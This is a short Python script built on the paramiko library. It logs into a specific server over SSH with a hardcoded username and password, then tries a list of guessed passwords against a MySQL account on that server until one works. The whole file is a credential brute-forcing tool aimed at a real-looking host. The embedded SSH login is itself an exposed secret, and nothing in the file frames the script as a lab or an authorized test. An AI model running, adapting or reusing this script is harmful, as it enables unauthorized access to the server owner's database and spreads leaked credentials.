import paramiko

def brute_variations():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    host = '82.198.228.182'
    port = 65002
    user = 'u754458241'
    pasw = '@n9qe3KgL'
    
    try:
        client.connect(host, port=port, username=user, password=pasw)
        
        variations = [
            'Mersal2026', 'Mersal2025', 'Mersal2024',
            'MersalElite2026', 'MersalEliteSecret2026',
            'Code_2252', 'Code2252',
            'Admin@Morsall2026', 'Morsall2026', 'Morsal@2026'
        ]
        
        for p in variations:
            print(f"Testing: {p}... ", end="")
            cmd = f"mysql -u u754458241_Kanan -p'{p}' -e 'SELECT 1;' u754458241_Kanan"
            stdin, stdout, stderr = client.exec_command(cmd)
            if stdout.read().decode().strip():
                print("✅ SUCCESS!")
                break
            else:
                print("❌")
            
        client.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    brute_variations()
